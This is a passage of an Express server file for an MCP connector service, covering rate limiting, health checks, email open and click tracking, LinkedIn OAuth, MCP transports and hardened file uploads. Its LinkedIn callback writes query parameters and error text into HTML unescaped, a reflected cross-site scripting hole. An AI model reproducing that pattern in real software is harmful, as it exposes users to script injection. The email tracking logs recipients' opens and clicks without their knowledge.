// small set that must be publicly reachable, are allowlisted inside
// src/middleware/mcpAuth.js with a written justification each.
// ---------------------------------------------------------------------------
app.use(mcpAuthMiddleware);

// ---------------------------------------------------------------------------
// Rate limiting  (v12.28.0 -- TNX-C-001 resolution item 5)
//
// express-rate-limit was already a declared dependency but was referenced
// nowhere. Applied to the MCP transports and the credentialled tool-dispatch
// endpoints, which are the paths that reach the tool surface.
//
// `trust proxy` is set on the app below so that req.ip is the client address
// from X-Forwarded-For rather than the Railway edge address, which would
// otherwise collapse every caller into a single bucket.
// ---------------------------------------------------------------------------
const MCP_RATE_WINDOW_MS = parseInt(process.env.MCP_RATE_WINDOW_MS || "60000", 10);
const MCP_RATE_MAX       = parseInt(process.env.MCP_RATE_MAX       || "240",   10);

const mcpRateLimiter = rateLimit({
  windowMs: Number.isFinite(MCP_RATE_WINDOW_MS) && MCP_RATE_WINDOW_MS > 0 ? MCP_RATE_WINDOW_MS : 60_000,
  max:      Number.isFinite(MCP_RATE_MAX)       && MCP_RATE_MAX       > 0 ? MCP_RATE_MAX       : 240,
  standardHeaders: true,
  legacyHeaders:   false,
  message: { error: "Too many requests. Slow down and retry.", code: "RATE_LIMITED" },
});

app.get('/api/config.js', (_req, res) => {
  const publicDomain = process.env.RAILWAY_PUBLIC_DOMAIN || 'claude-connector-production.up.railway.app';
  const protocol = process.env.RAILWAY_PUBLIC_DOMAIN ? 'https' : 'http';
  const connectorUrl = `${protocol}://${publicDomain}`;
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Cache-Control', 'no-cache, max-age=60');
  res.send(`window.__TI_CONFIG = window.__TI_CONFIG || { connectorUrl: "${connectorUrl}" };\n`);
});
// -----------------------------------------------------------------------
// Health
// -----------------------------------------------------------------------
// v12.28.0 (TNX-M-004): /health must stay publicly reachable because the
// orchestrator probes it before any credential is available. Its previous
// payload enumerated which integrations were configured -- Slack, Teams,
// Calendar, Sheets, email dispatch, LinkedIn OAuth, the memory subsystem --
// which is a reconnaissance map for an attacker choosing a target.
//
// The public response is now a bare liveness signal. The full diagnostic
// payload is preserved verbatim and returned only to an authenticated caller,
// so operator tooling that presents the Authorization header sees no change.
// ---------------------------------------------------------------------------
// Health endpoints  (v12.28.0 -- remediates TNX-H-004)
//
// The previous single /health handler was decorative. `status` was the string
// literal "ok". Nothing was verified: not the /data volume mount, not the
// SQLite memory database, not disk writability, not configuration validity.
//
// That matters because railway.toml sets healthcheckPath="/health" and the
// Dockerfile HEALTHCHECK polls the same path. If the volume failed to mount --
// the failure mode that silently destroys the memory store and the credentials
// file -- /health still returned "ok", the platform kept routing traffic to a
// broken instance, and the restart policy could never fire for anything short
// of a process exit.
//
// It was also an unauthenticated configuration inventory, enumerating every
// configured integration. That is addressed separately (TNX-M-004): the
// detailed payload now requires authentication.
//
// Three endpoints, answering three different questions:
//
//   /health/live    Is the process alive? No I/O, no dependencies, stays 200
//                   during drain. A liveness probe that touches storage will
//                   fail during a storage outage and cause the orchestrator to
//                   restart a healthy process, turning a recoverable
//                   dependency failure into a crash loop.
//
//   /health/ready   Should traffic be routed here? Actually verifies the
//                   volume, the memory subsystem and configuration. Returns
//                   503 while draining or when a critical check fails.
//
//   /health         Alias of /health/ready, so existing railway.toml and
//                   Dockerfile configuration keeps working. Point both at
//                   /health/ready when convenient.
// ---------------------------------------------------------------------------

/**
 * Readiness checks. Each returns true when healthy or throws with a reason.
 *
 * `critical: false` marks a check that degrades the report without failing
 * readiness, used where the subsystem is optional in some deployments.
 */
function buildReadinessChecks() {
  const checks = [];

  // The persistent volume. This is the check whose absence made the old
  // handler dangerous: an unmounted /data destroys the memory store, the
  // schedule store and the download directory, and nothing noticed.
  checks.push({
    name: 'data_volume',
    run: () => {
      const dir = process.env.DATA_VOLUME_PATH || '/data';
      if (!existsSync(dir)) throw new Error(`${dir} is not present`);
      // Presence is not enough. A read-only or full volume presents as mounted
      // and then fails every write, so probe with an actual write.
      const probe = pathJoin(dir, '.health-probe');
      writeFileSync(probe, String(Date.now()), 'utf8');
      unlinkSync(probe);
      return true;
    },
  });

  // The memory subsystem, when enabled. Reported but not fatal: the connector
  // serves ~60 tools and only six of them are memory tools, so a memory outage
  // should not remove the whole instance from rotation.
  if (MEMORY_ENABLED) {
    checks.push({
      name: 'memory',
      critical: false,
      run: () => {
        const snapshot = getMemoryHealthSnapshot();
        if (snapshot && snapshot.healthy === false) {
          throw new Error(snapshot.error || 'memory subsystem reports unhealthy');
        }
        return true;
      },
    });
  }

  // Credential persistence. Non-critical: the connector serves its other tools
  // perfectly well without a writable credential store, and removing the whole
  // instance from rotation would be a larger outage than the one being
  // reported. Surfacing it here is what makes the TNX-H-014 silent-loss
  // condition visible rather than being discovered after a redeploy.
  checks.push({
    name: 'credential_store',
    critical: false,
    run: () => {
      const state = checkStorageLocation();
      if (state.insideImage) throw new Error('credential directory is inside the container image; credentials will be lost on redeploy');
      if (!state.writable)   throw new Error(`credential directory is not writable: ${state.detail}`);
      return true;
    },
  });

  // Configuration validity. An instance that cannot authenticate callers is
  // not ready to receive them.
  checks.push({
    name: 'configuration',
    run: () => {
      if (!(process.env.MCP_API_KEY || '').trim()) throw new Error('MCP_API_KEY is not set');
      return true;
    },
  });

  return checks;
}

app.get("/health/live", (_req, res) => {
  // Deliberately 200 even while draining. If liveness failed during drain the
  // orchestrator would conclude the container had hung and SIGKILL an instance
  // that was shutting down correctly, destroying the in-flight tool calls the
  // drain exists to protect.
  res.json({
    status:  "alive",
    server:  "claude-connector",
    version: CONNECTOR_VERSION,
    uptime_s: uptimeSeconds(),
    ts:      new Date().toISOString(),
  });
});

app.get(["/health/ready", "/health"], async (req, res) => {
  if (isShuttingDown()) {
    res.setHeader("Retry-After", "5");
    res.status(503).json({
      status: "draining", server: "claude-connector", ts: new Date().toISOString(),
    });
    return;
  }

  const report = await runReadinessChecks(buildReadinessChecks());

  if (!report.ready) {
    res.setHeader("Retry-After", "5");
    res.status(503).json({
      status: "not_ready",
      server: "claude-connector",
      checks: report.checks,
      ts:     new Date().toISOString(),
    });
    return;
  }

  // v12.28.0 (TNX-M-004): the integration inventory below is a target list for
  // anyone probing the service, so it is returned only to an authenticated
  // caller. An unauthenticated probe gets readiness and nothing else.
  if (!req.mcpAuthenticated) {
    res.json({
      status: "ok", server: "claude-connector", checks: report.checks, ts: new Date().toISOString(),
    });
    return;
  }

  const memorySnapshot = MEMORY_ENABLED ? getMemoryHealthSnapshot() : { enabled: false };
  res.json({
    status: "ok",
    server: "claude-connector",
    // v12.28.0 (TNX-M-005): read from package.json at boot rather than being
    // hardcoded. The old handler reported 12.26.0 while package.json said
    // 12.27.0, so the field misidentified the running build.
    version: CONNECTOR_VERSION,
    uptime_s: uptimeSeconds(),
    checks: report.checks,
    memory: memorySnapshot,
    statsAndMlEnabled: true,
    transport: ["streamable-http", "sse-legacy"],
    linkedinOAuth: !!(config.linkedinClientId && config.linkedinClientSecret),
    psychologyEndpoints: true,
    emailSendEnabled: config.emailSendEnabled,
    emailHtmlEnabled: config.emailHtmlEnabled,
    emailTrackingEnabled: config.emailTrackingEnabled,
    scheduleEnabled: config.scheduleEnabled,
    calendarEnabled: !!(config.googleCalendarId),
    sheetsEnabled: !!(config.googleSheetsId),
    slackEnabled: !!(config.slackBotToken),
    teamsEnabled: !!(config.teamsWebhookUrl),
    webhookEnabled: true,
    profilesEnabled: PROFILES_ENABLED,
    timestamp: new Date().toISOString(),
  });
});

// ---------------------------------------------------------------------------
// INTERNAL CONFIG BRIDGE  (v12.37.0)
//
// GET|POST /internal/config/env
//
// Publishes a narrow, code-bounded set of runtime values so the session
// orchestrator can learn the connector's own public URL without it being
// hardcoded into a skill file.
//
// The logic lives in utils/internalConfig.js so the authentication path can be
// unit tested without binding a listener. That file also carries the full
// rationale for why the default published set is CONNECTOR_URL alone.
//
// AUTHENTICATION
// --------------
// X-Railway-Restore-Token via constantTimeEquals(), which hashes both operands
// to a fixed 32 bytes first. That detail is load-bearing: crypto.timingSafeEqual
// throws on a length mismatch and the resulting 500 would disclose the expected
// token length. The route is listed in SELF_AUTHENTICATED_ROUTES in
// middleware/mcpAuth.js for the same reason /tool-call is -- the gateway holds
// this token and has no way to hold MCP_API_KEY.
//
// Both methods are registered because the documented session-start protocol
// issues a POST while the semantics are a read. Accepting both avoids a silent
// 404 that would present as "the orchestrator never cached the config".
// ---------------------------------------------------------------------------

const handleInternalConfigEnv = createInternalConfigHandler({
  getRestoreToken:    () => RAILWAY_RESTORE_TOKEN,
  constantTimeEquals,
  log,
});

app.get("/internal/config/env", mcpRateLimiter, handleInternalConfigEnv);
app.post("/internal/config/env", mcpRateLimiter, handleInternalConfigEnv);

// -----------------------------------------------------------------------
// v10.0.0: Persistent Memory admin export
// GET /memory/admin/dump - protected full corpus export (bearer required).
// Returns 404 when the memory subsystem is disabled.
// -----------------------------------------------------------------------
app.get("/memory/admin/dump", (req, res) => {
  if (!MEMORY_ENABLED) {
    res.status(404).json({ error: "Memory subsystem is not enabled." });
    return;
  }
  const header = req.headers["authorization"] || "";
  const match = /^Bearer\s+(.+)$/i.exec(header);
  const supplied = match ? match[1].trim() : "";
  if (!constantTimeEquals(supplied, MEMORY_AUTH_TOKEN)) {
    res.status(401).json({
      error: "Authorization header missing or invalid.",
      code: "AUTH_REQUIRED",
    });
    return;
  }
  memoryAdminDumpHandler(req, res);
});

// -----------------------------------------------------------------------
// SCOPE-04 -- Tracking endpoints
// -----------------------------------------------------------------------

function clientIp(req) {
  const fwd = (req.headers["x-forwarded-for"] || "").toString().split(",")[0].trim();
  return fwd || req.ip || req.connection?.remoteAddress || "";
}

app.get("/track/open", async (req, res) => {
  // Always return the pixel - never expose validation errors to the recipient
  res.setHeader("Content-Type", "image/png");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
  res.status(200).end(PIXEL_PNG);

  if (!config.emailTrackingEnabled) return;

  try {
    const id = String(req.query.id || "");
    if (!id) return;
    const ua = req.headers["user-agent"] || "";
    const ref = req.headers["referer"] || req.headers["referrer"] || "";
    const uaType = classifyUserAgent(ua, ref);
    const ipHash = hashIp(clientIp(req));

    const meta = getSendMetadata(id) || {};
    const open_count = incrementOpen(id);

    appendTrackingEvent({
      tracking_id: id,
      event_type: "open",
      to_address: meta.to_address || "",
      to_name: meta.to_name || "",
      subject: meta.subject || "",
      sender_id: meta.sender_id || "",
      company: meta.company || "",
      send_timestamp: meta.send_timestamp || "",
      click_url: "",
      user_agent_type: uaType,
      open_count,
      schedule_id: meta.schedule_id || "",
      user_agent_raw: ua,
      ip_hash: ipHash,
    }).catch((e) => log("warn", `track/open append failed: ${e.message}`));
  } catch (err) {
    log("warn", `track/open handler error: ${err.message}`);
  }
});

app.get("/track/click", async (req, res) => {
  const SAFE_FALLBACK = "https://truesourceconsulting.com.au";
  let target = SAFE_FALLBACK;

  try {
    const id = String(req.query.id || "");
    const rawUrl = String(req.query.url || "");
    let isValid = false;
    try {
      const u = new URL(rawUrl);
      if (u.protocol === "https:") {
        target = u.toString();
        isValid = true;
      }
    } catch (_) {
      isValid = false;
    }

    if (config.emailTrackingEnabled && id) {
      const ua = req.headers["user-agent"] || "";
      const ref = req.headers["referer"] || req.headers["referrer"] || "";
      const uaType = classifyUserAgent(ua, ref);
      const ipHash = hashIp(clientIp(req));
      const meta = getSendMetadata(id) || {};

      appendTrackingEvent({
        tracking_id: id,
        event_type: "click",
        to_address: meta.to_address || "",
        to_name: meta.to_name || "",
        subject: meta.subject || "",
        sender_id: meta.sender_id || "",
        company: meta.company || "",
        send_timestamp: meta.send_timestamp || "",
        click_url: isValid ? target : "",
        user_agent_type: uaType,
        schedule_id: meta.schedule_id || "",
        user_agent_raw: ua,
        ip_hash: ipHash,
      }).catch((e) => log("warn", `track/click append failed: ${e.message}`));
    }
  } catch (err) {
    log("warn", `track/click handler error: ${err.message}`);
  }

  res.redirect(302, target);
});

// -----------------------------------------------------------------------
// LinkedIn OAuth callback
// -----------------------------------------------------------------------
app.get("/auth/linkedin/callback", async (req, res) => {
  const { code, state, error, error_description } = req.query;

  if (error) {
    res.status(400).send(`<html><body style="font-family:sans-serif;max-width:600px;margin:40px auto;padding:20px">
      <h2 style="color:#c00">LinkedIn Authorization Failed</h2>
      <p><strong>Error:</strong> ${error}</p><p>${error_description || ""}</p>
      <p>Close this tab and call <code>linkedin_start_oauth</code> again in Claude.</p>
    </body></html>`);
    return;
  }

  if (!code || !state) {
    res.status(400).send(`<html><body style="font-family:sans-serif;max-width:600px;margin:40px auto;padding:20px">
      <h2 style="color:#c00">Invalid Callback</h2><p>Missing code or state. Try the authorization flow again.</p>
    </body></html>`);
    return;
  }

  if (!validateAndConsumeState(state)) {
    res.status(400).send(`<html><body style="font-family:sans-serif;max-width:600px;margin:40px auto;padding:20px">
      <h2 style="color:#c00">Expired or Invalid State</h2>
      <p>The authorization link expired (10 min limit) or was already used.</p>
      <p>Call <code>linkedin_start_oauth</code> in Claude to get a fresh link.</p>
    </body></html>`);
    return;
  }

  try {
    const tokenResp = await fetch("https://www.linkedin.com/oauth/v2/accessToken", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        grant_type: "authorization_code",
        code,
        redirect_uri: getLinkedInCredentials().redirectUri,
        client_id: getLinkedInCredentials().clientId,
        client_secret: getLinkedInCredentials().clientSecret,
      }).toString(),
    });

    if (!tokenResp.ok) {
      const errBody = await tokenResp.text().catch(() => "");
      throw new Error(`LinkedIn token exchange failed (${tokenResp.status}): ${errBody}`);
    }

    const tokenData = await tokenResp.json();
    storeToken(tokenData);
    log("info", "LinkedIn token stored successfully");

    const expiresHours = tokenData.expires_in ? Math.round(tokenData.expires_in / 3600) : "unknown";

    res.send(`<html>
    <head><title>LinkedIn Connected</title></head>
    <body style="font-family:sans-serif;max-width:600px;margin:60px auto;padding:20px;text-align:center">
      <div style="background:#e8f5e9;border:2px solid #4caf50;border-radius:10px;padding:40px">
        <h2 style="color:#2e7d32;margin-top:0">LinkedIn Connected!</h2>
        <p style="font-size:16px">Your LinkedIn account is now authorized.</p>
        <p>Close this tab and return to Claude.</p>
      </div>
      <p style="color:#888;font-size:12px;margin-top:20px">Token expires in approx. ${expiresHours} hours</p>
    </body></html>`);
  } catch (err) {
    log("error", `LinkedIn callback error: ${err.message}`);
    res.status(500).send(`<html><body style="font-family:sans-serif;max-width:600px;margin:40px auto;padding:20px">
      <h2 style="color:#c00">Server Error</h2><p>${err.message}</p>
      <p>Try <code>linkedin_start_oauth</code> again in Claude.</p>
    </body></html>`);
  }
});

// -----------------------------------------------------------------------
// Streamable HTTP - PRIMARY MCP TRANSPORT FOR CLAUDE.AI
// -----------------------------------------------------------------------
const streamableSessions = {};

// v12.0.0: Tenant authentication gate.
// In tenant mode, validates the API key against the TrueSource Client Gateway
// before the MCP session is allowed to proceed. In owner mode this is a no-op.
app.all("/mcp", mcpRateLimiter, tenantAuthMiddleware, async (req, res) => {
  const sessionId = req.headers["mcp-session-id"];
  try {
    if (sessionId && streamableSessions[sessionId]) {
      await streamableSessions[sessionId].handleRequest(req, res, req.body);
      return;
    }
    if (!sessionId && req.method === "POST" && isInitializeRequest(req.body)) {
      const transport = new StreamableHTTPServerTransport({ sessionIdGenerator: () => randomUUID() });
      const server = createMcpServer(req.tenantContext || null);
      transport.onclose = () => {
        if (transport.sessionId) { delete streamableSessions[transport.sessionId]; }
      };
      await server.connect(transport);
      await transport.handleRequest(req, res, req.body);
      if (transport.sessionId) {
        streamableSessions[transport.sessionId] = transport;
        log("info", `New session: ${transport.sessionId}`);
      }
      return;
    }
    if (req.method === "GET" && !sessionId) {
      res.status(405).json({ error: "Session required for GET" });
      return;
    }
    res.status(400).json({ error: "Bad request: missing or invalid session" });
  } catch (err) {
    log("error", `MCP error: ${err.message}`);
    if (!res.headersSent) res.status(500).json({ error: "Internal server error" });
  }
});

// -----------------------------------------------------------------------
// Legacy SSE transport
// -----------------------------------------------------------------------
const sseSessions = {};

app.get("/sse", mcpRateLimiter, async (req, res) => {
  const transport = new SSEServerTransport("/messages", res);
  sseSessions[transport.sessionId] = transport;
  res.on("close", () => { delete sseSessions[transport.sessionId]; });
  await createMcpServer(null).connect(transport);
});

app.post("/messages", mcpRateLimiter, async (req, res) => {
  const transport = sseSessions[req.query.sessionId];
  if (!transport) { res.status(404).json({ error: "Session not found" }); return; }
  await transport.handlePostMessage(req, res, req.body);
});

// -----------------------------------------------------------------------
// Inbound Webhook receiver (v8.0.0)
// -----------------------------------------------------------------------
app.post("/webhook", async (req, res) => {
  if (!validateWebhookSecret(req.headers)) {
    res.status(401).json({ error: "Invalid or missing X-Webhook-Secret header." });
    return;
  }

  let payload = req.body;
  if (!payload || (typeof payload === "object" && Object.keys(payload).length === 0)) {
    // Body may be raw text if content-type is not json
    payload = { raw: String(req.body || "") };
  }

  const sourceIp =
    (req.headers["x-forwarded-for"] || "").toString().split(",")[0].trim() ||
    req.ip ||
    "";

  try {
    const eventId = enqueueWebhookEvent(payload, sourceIp, req.headers);
    res.status(200).json({ ok: true, event_id: eventId });
  } catch (err) {
    log("error", `webhook enqueue error: ${err.message}`);
    res.status(500).json({ error: "Failed to enqueue event." });
  }
});

// -----------------------------------------------------------------------
// CSV upload endpoint (protected by UPLOAD_API_KEY)
// -----------------------------------------------------------------------
app.post("/upload/connections", async (req, res) => {
  if (!UPLOAD_API_KEY) {
    res.status(403).json({ error: "Upload disabled. Set UPLOAD_API_KEY in Railway Variables." });
    return;
  }
  if (!constantTimeEquals(String(req.headers["x-upload-key"] || ""), UPLOAD_API_KEY)) {
    res.status(401).json({ error: "Invalid upload key" });
    return;
  }

  const ct = req.headers["content-type"] || "";
  let csvContent = "";
  if (ct.includes("text/csv") || ct.includes("text/plain")) {
    csvContent = await new Promise((resolve, reject) => {
      const chunks = [];
      req.on("data", c => chunks.push(c));
      req.on("end", () => resolve(Buffer.concat(chunks).toString("utf-8")));
      req.on("error", reject);
    });
  } else if (req.body?.csv_base64) {
    csvContent = Buffer.from(req.body.csv_base64, "base64").toString("utf-8");
  } else if (req.body?.csv) {
    csvContent = req.body.csv;
  } else {
    res.status(400).json({ error: "Provide CSV as text/csv body, JSON {csv: '...'} or {csv_base64: '...'}" });
    return;
  }

  if (!csvContent?.trim()) { res.status(400).json({ error: "CSV is empty" }); return; }

  const targetPath = config.linkedinCsvPath;
  const dir = dirname(targetPath);
  if (!existsSync(dir)) mkdirSync(dir, { recursive: true });

  try {
    writeFileSync(targetPath, csvContent, "utf-8");
    log("info", `CSV uploaded: ${csvContent.length} bytes`);
    res.json({ success: true, bytes: csvContent.length });
  } catch (err) {
    res.status(500).json({ error: `Write failed: ${err.message}` });
  }
});
// -----------------------------------------------------------------------
// POST /data/upload
// Receives a file (base64) from the Tenax chat UI and saves it to the
// persistent volume at /mnt/user-data/uploads/ so the document renderer
// and other tools can reference it by filepath.
// Body: { filename, content_base64, mime_type?, ttl_hours? }
// Returns: { success, filepath, filename, size, mime_type, expires_at }
// -----------------------------------------------------------------------
const USER_DATA_UPLOAD_DIR = process.env.USER_DATA_UPLOAD_DIR || '/data/uploads/';
const MAX_UPLOAD_SIZE = parseInt(process.env.MAX_UPLOAD_SIZE || '10485760', 10); // 10MB default
const DEFAULT_TTL_HOURS = 24;

// ---------------------------------------------------------------------------
// Upload extension policy  (v12.12.0)
//
// The previous allowlist was:
//   ['.png','.jpg','.jpeg','.gif','.svg','.webp','.bmp','.pdf','.docx',
//    '.txt','.md','.json','.csv','.html']
//
// It omitted .pptx, .xlsx and .zip. That is why PPTX uploads silently failed:
// 05-attachments.js has always POSTed the .pptx binary here, and this endpoint
// has always answered 400 'Extension not allowed'. The client discards the
// error (`return data.success ? data.filepath : ''`), so nothing surfaced.
//
// The policy is now allowlist-first with an explicit denylist on top, so that
// broadening the allowlist can never accidentally admit an executable.
// ---------------------------------------------------------------------------

/** Documents and office formats the render/edit script suite can operate on. */
const UPLOAD_EXT_DOCUMENTS = [
  '.pdf',
  '.docx', '.doc', '.dotx',
  '.xlsx', '.xls', '.xlsm', '.xltx',
  '.pptx', '.ppt', '.potx',
  '.odt', '.ods', '.odp',
  '.rtf', '.epub',
];

/** Raster and vector images. */
const UPLOAD_EXT_IMAGES = [
  '.png', '.jpg', '.jpeg', '.gif', '.webp', '.bmp', '.svg',
  '.tif', '.tiff', '.avif', '.heic', '.ico',
];

/** Plain text, markup and structured data. */
const UPLOAD_EXT_TEXT = [
  '.txt', '.md', '.markdown', '.json', '.jsonl', '.csv', '.tsv',
  '.xml', '.yaml', '.yml', '.html', '.htm', '.log', '.ini', '.toml', '.env',
];

/** Source files. Inert here: script_execute only runs from the scripts dir. */
const UPLOAD_EXT_CODE = [
  '.js', '.mjs', '.cjs', '.ts', '.tsx', '.jsx', '.py', '.php', '.rb', '.go',
  '.rs', '.java', '.kt', '.swift', '.c', '.h', '.cpp', '.hpp', '.cs',
  '.sh', '.bash', '.zsh', '.sql', '.css', '.scss', '.less', '.vue', '.svelte',
];

/** Compressed archives. Stored as opaque blobs; never auto-extracted here. */
const UPLOAD_EXT_ARCHIVES = [
  '.zip', '.tar', '.gz', '.tgz', '.bz2', '.xz', '.7z', '.rar',
  '.apk', '.ipa',
];

const UPLOAD_ALLOWED_EXTS = new Set([
  ...UPLOAD_EXT_DOCUMENTS,
  ...UPLOAD_EXT_IMAGES,
  ...UPLOAD_EXT_TEXT,
  ...UPLOAD_EXT_CODE,
  ...UPLOAD_EXT_ARCHIVES,
]);

/**
 * Denied unconditionally, even if some future edit adds them above.
 *
 * Nothing in this container executes files from the upload directory, so these
 * are not an active threat today. They are refused anyway: the upload volume is
 * mounted into the same filesystem the script suite reads from, and an
 * allowlist that quietly accumulates entries is exactly how a staging directory
 * turns into a delivery mechanism. Cheap to refuse now, expensive to discover later.
 */
const UPLOAD_DENIED_EXTS = new Set([
  '.exe', '.dll', '.so', '.dylib', '.bin', '.msi', '.app', '.deb', '.rpm',
  '.bat', '.cmd', '.com', '.scr', '.ps1', '.vbs', '.jar', '.war',
]);

/**
 * Decides whether an uploaded filename may be stored.
 *
 * @param  {string} ext  Lower-cased extension including the dot.
 * @return {{ ok: boolean, reason?: string }}
 */
function uploadExtensionAllowed(ext) {
  if (!ext) {
    return { ok: false, reason: 'Files must have an extension.' };
  }
  if (UPLOAD_DENIED_EXTS.has(ext)) {
    return { ok: false, reason: `Extension '${ext}' is not accepted (executable content).` };
  }
  if (!UPLOAD_ALLOWED_EXTS.has(ext)) {
    return { ok: false, reason: `Extension '${ext}' is not supported.` };
  }
  return { ok: true };
}

function ensureUploadDir() {
  if (!existsSync(USER_DATA_UPLOAD_DIR)) {
    mkdirSync(USER_DATA_UPLOAD_DIR, { recursive: true, mode: 0o755 });
  }
}

/**
 * Upload categories permitted to have their own subdirectory.
 *
 * v12.34.0 (Stage 2a): homework submissions land in their own folder rather
 * than mixing with chat attachments, so retention, review and cleanup can treat
 * them separately.
 *
 * An ALLOWLIST, not a sanitiser. The category reaches a filesystem path, and
 * this endpoint is on the unauthenticated public allowlist (TNX-C-001 residual
 * risk), so a caller-supplied path segment is exactly the input that must not
 * be merely escaped. Anything not on this list falls back to the shared root.
 */
const UPLOAD_CATEGORIES = new Set([ 'homework' ]);

/**
 * Resolve the directory for an upload category.
 *
 * Even with the allowlist above, the result is passed through resolveContained
 * so a future edit that widens the list cannot produce a path outside the
 * upload root. Two independent controls, because the cost of the second is a
 * single function call.
 *
 * @param {unknown} category
 * @returns {{ dir: string, category: string }}
 */
function resolveUploadDir(category) {
  const raw = String(category == null ? '' : category).trim().toLowerCase();
  if (!raw || !UPLOAD_CATEGORIES.has(raw)) {
    return { dir: USER_DATA_UPLOAD_DIR, category: '' };
  }

  const contained = resolveContained(USER_DATA_UPLOAD_DIR, raw);
  if (!contained) {
    log('warn', `upload: category "${raw}" did not resolve inside the upload root; using the root`);
    return { dir: USER_DATA_UPLOAD_DIR, category: '' };
  }

  if (!existsSync(contained)) mkdirSync(contained, { recursive: true, mode: 0o755 });
  return { dir: contained, category: raw };
}

// ---------------------------------------------------------------------------
// Upload retention sweeper  (v12.12.0)
//
// WHY THIS IS NEW CODE RATHER THAN A FIX
//
// The upload handler has always written an `expires_at` timestamp into
// <file>.meta.json. Nothing has ever read it. There was no sweeper, no cron, no
// cleanup on boot: every file ever uploaded through the chat UI is still on the
// volume. The retention policy was documented in the metadata and enforced
// nowhere.
//
// This implements it. A file is removed once it is past its expires_at, along
// with its sidecar metadata.
//
// Design notes:
//
//  - Orphans (a file with no .meta.json, e.g. written by /data/upload-binary
//    or restored from a snapshot) fall back to mtime + the default TTL rather
//    than living forever or being deleted immediately on the next sweep.
//
//  - Unparseable metadata is treated as an orphan, not as a reason to skip the
//    file. A corrupt sidecar must not grant immortality.
//
//  - Every unlink is bounds-checked against the upload directory. The names
//    come from readdir so they cannot traverse, but the check costs nothing and
//    means a future caller passing a name in cannot turn this into an arbitrary
//    delete.
//
//  - The interval is unref'd. A non-unref'd timer prevents the process from
//    exiting on SIGTERM, which gets the container SIGKILLed on redeploy and
//    severs in-flight connections. That exact bug was found in the gateway's
//    rate limiter; it is not being reintroduced here.
// ---------------------------------------------------------------------------

const UPLOAD_MAX_TTL_HOURS   = parseInt(process.env.UPLOAD_MAX_TTL_HOURS   || '24', 10);
const UPLOAD_SWEEP_INTERVAL_MS = parseInt(process.env.UPLOAD_SWEEP_INTERVAL_MS || String(15 * 60 * 1000), 10);
const UPLOAD_SWEEP_ENABLED   = (process.env.UPLOAD_SWEEP_ENABLED || 'true').toLowerCase() !== 'false';

/**
 * Resolves the expiry instant for one stored upload.
 *
 * @param  {string} filePath  Absolute path to the stored file.
 * @param  {string} metaPath  Absolute path to its .meta.json sidecar.
 * @return {number|null} Epoch ms at which the file expires, or null if undecidable.
 */
function resolveUploadExpiry(filePath, metaPath, defaultTtlHours = DEFAULT_TTL_HOURS) {
  if (existsSync(metaPath)) {
    try {
      const meta = JSON.parse(readFileSync(metaPath, 'utf8'));
      const when = Date.parse(meta.expires_at);
      if (!Number.isNaN(when)) return when;
    } catch (_) {
      // Corrupt sidecar: fall through to the mtime rule below.
    }
  }
  // Orphan or corrupt metadata: age the file from its mtime using the default
  // TTL, so it is still reclaimed eventually.
  try {
    return statSync(filePath).mtimeMs + defaultTtlHours * 3600_000;
  } catch (_) {
    return null;
  }
}

/**
 * Deletes a path only if it genuinely sits inside the upload directory.
 *
 * @param  {string} target
 * @return {boolean} true when the file was removed.
 */
function safeUnlinkUpload(target, rootDir) {
  const root = pathResolve(rootDir);
  const full = pathResolve(target);
  if (full !== root && !full.startsWith(root + '/')) {
    log('error', `sweep: refusing to delete outside upload dir: ${full}`);
    return false;
  }
  try {
    unlinkSync(full);
    return true;
  } catch (err) {
    if (err.code !== 'ENOENT') {
      log('warn', `sweep: could not delete ${full}: ${err.message}`);
    }
    return false;
  }
}

/**
 * Removes every file in `dir` whose retention window has elapsed.
 *
 * Generic over the directory so the same reaper serves two very different
 * retention policies without a second copy of the logic:
 *
 *   /data/uploads    24 hours   - staging for files the user just attached
 *   /data/downloads  14 days    - generated artefacts the user may come back to
 *
 * The two differ only in TTL and in what must never be touched. Downloads holds
 * ava_brain_data.json, which is not a generated artefact at all: it is the
 * Neural Core's architecture scan, read by the visualisation on every load.
 * Ageing it out would silently break that view a fortnight after deploy, which
 * is exactly the kind of failure nobody connects back to a cleanup job. It is
 * protected by name.
 *
 * Safe to call at any time; never throws.
 *
 * @param  {object}   opts
 * @param  {string}   opts.dir             Directory to sweep.
 * @param  {number}   opts.ttlHours        Fallback TTL for files with no usable sidecar.
 * @param  {Set<string>} [opts.protected]  Basenames that must never be deleted.
 * @param  {string}   [opts.label]         Tag used in log lines.
 * @return {{ scanned: number, removed: number, bytes: number, errors: number, skipped: number }}
 */
function sweepExpiredFiles({ dir, ttlHours, protected: protectedNames = new Set(), label = 'sweep' }) {
  const stats = { scanned: 0, removed: 0, bytes: 0, errors: 0, skipped: 0 };
  const now = Date.now();

  let entries;
  try {
    if (!existsSync(dir)) return stats;
    entries = readdirSync(dir);
  } catch (err) {
    log('error', `${label}: cannot read ${dir}: ${err.message}`);
    stats.errors++;
    return stats;
  }

  for (const name of entries) {
    if (name.endsWith('.meta.json')) continue;   // handled with its parent

    if (protectedNames.has(name)) {
      stats.skipped++;
      continue;
    }

    const filePath = pathJoin(dir, name);
    const metaPath = filePath + '.meta.json';
    stats.scanned++;

    try {
      // Directories are not artefacts; never recurse or unlink them.
      let st;
      try { st = statSync(filePath); } catch (_) { continue; }
      if (st.isDirectory()) { stats.skipped++; continue; }

      const expiresAt = resolveUploadExpiry(filePath, metaPath, ttlHours);
      if (expiresAt === null || now < expiresAt) continue;

      const size = st.size;
      if (safeUnlinkUpload(filePath, dir)) {
        stats.removed++;
        stats.bytes += size;
        if (existsSync(metaPath)) safeUnlinkUpload(metaPath, dir);
      }
    } catch (err) {
      stats.errors++;
      log('warn', `${label}: error handling ${name}: ${err.message}`);
    }
  }

  if (stats.removed > 0) {
    log('info',
      `${label}: removed ${stats.removed} expired file(s), ` +
      `${(stats.bytes / 1048576).toFixed(2)} MB reclaimed ` +
      `(${stats.scanned} scanned, ${stats.skipped} protected)`);
  }
  return stats;
}

// --- Retention policies -----------------------------------------------------

const DOWNLOADS_DIR            = process.env.DOWNLOADS_DIR || '/data/downloads/';

/**
 * How long a generated artefact survives on the volume, in hours. 72 = 3 days.
 *
 * Calibrated to match the signed-link lifetime (LINK_EXPIRY_SECONDS, default
 * 259200s = 3 days) and the Gateway Service sidebar row TTL (DOCUMENT_TTL_DAYS,
 * default 3). All three are intended to expire together; see the
